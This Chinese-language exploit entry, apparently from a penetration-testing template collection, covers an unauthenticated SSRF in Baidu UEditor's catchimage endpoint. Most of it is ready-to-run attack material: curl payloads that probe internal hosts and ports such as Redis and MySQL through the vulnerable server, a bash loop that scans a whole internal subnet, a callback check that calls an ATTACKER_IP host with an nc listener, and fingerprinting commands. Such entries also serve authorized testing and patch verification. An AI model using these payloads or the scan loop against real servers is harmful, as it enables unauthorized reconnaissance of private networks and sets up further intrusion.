---
id: UEDITOR-SSRF
title: UEditor catchimage SSRF 漏洞
product: ueditor
vendor: Baidu
version_affected: "UEditor JSP/PHP 版 1.4.2 - 1.4.3.3"
severity: HIGH
tags: [ssrf, 无需认证, 国产]
fingerprint: ["ueditor", "UEditor", "neditor"]
---

## 漏洞描述

百度 UEditor 编辑器的 catchimage（远程抓图）功能未对请求的目标 URL 进行充分限制，攻击者可以通过 `source[]` 参数指定内网地址，使服务端向任意内网主机发起 HTTP 请求。通过分析响应的不同状态（SUCCESS / 远程连接出错），可以探测内网主机存活和端口开放情况。JSP 版和 PHP 版均受影响。

## 影响版本

- UEditor JSP 版 1.4.2 - 1.4.3.3
- UEditor PHP 版 1.4.2 - 1.4.3.3

## 前置条件

- 无需认证
- 目标使用 UEditor JSP 或 PHP 版本
- catchimage 功能可用

## 利用步骤

1. 确认 UEditor catchimage 端点可访问
2. 构造包含内网 IP 的 source 参数
3. 发送请求并分析响应状态判断内网主机/端口是否可达
4. 遍历目标范围进行内网端口扫描

## Payload

**JSP 版 SSRF 探测**

```bash
# 探测内网主机 80 端口
curl -s "http://target/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://192.168.1.1:80/test.png"

# 探测内网 Redis (6379)
curl -s "http://target/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://192.168.1.1:6379/test.png"

# 探测内网 MySQL (3306)
curl -s "http://target/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://192.168.1.1:3306/test.png"
```

**PHP 版 SSRF 探测**

```bash
# PHP 版端点
curl -s "http://target/ueditor/php/controller.php?action=catchimage&source[]=http://192.168.1.1:80/test.png"
```

**批量内网扫描**

```bash
# 扫描内网 C 段常见端口
for ip in $(seq 1 254); do
  for port in 80 8080 3306 6379 27017 9200; do
    resp=$(curl -s -m 3 "http://target/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://192.168.1.${ip}:${port}/test.png")
    if echo "$resp" | grep -q "SUCCESS\|远程连接出错"; then
      echo "[+] 192.168.1.${ip}:${port} - $resp"
    fi
  done
done
```

## 验证方法

```bash
# 方法一：探测已知存活的内网服务
# 状态为 "SUCCESS" 或返回图片数据 → 端口开放且是 HTTP 服务
# 状态为 "远程连接出错" → 端口开放但非 HTTP（如 Redis/MySQL）
# 超时无响应 → 端口关闭或主机不可达
curl -s "http://target/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:80/test.png"

# 方法二：HTTP 回调验证
curl -s "http://target/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://ATTACKER_IP:8888/ssrf_confirm.png"
# 攻击机监听: nc -lvp 8888
```

## 指纹确认

```bash
# JSP 版
curl -s "http://target/ueditor/jsp/controller.jsp?action=config" | grep -i "imageUrl"

# PHP 版
curl -s "http://target/ueditor/php/controller.php?action=config" | grep -i "imageUrl"
```

## 参考链接

- https://github.com/fex-team/ueditor/issues/3814
- https://www.cnblogs.com/backlion/p/14067126.html
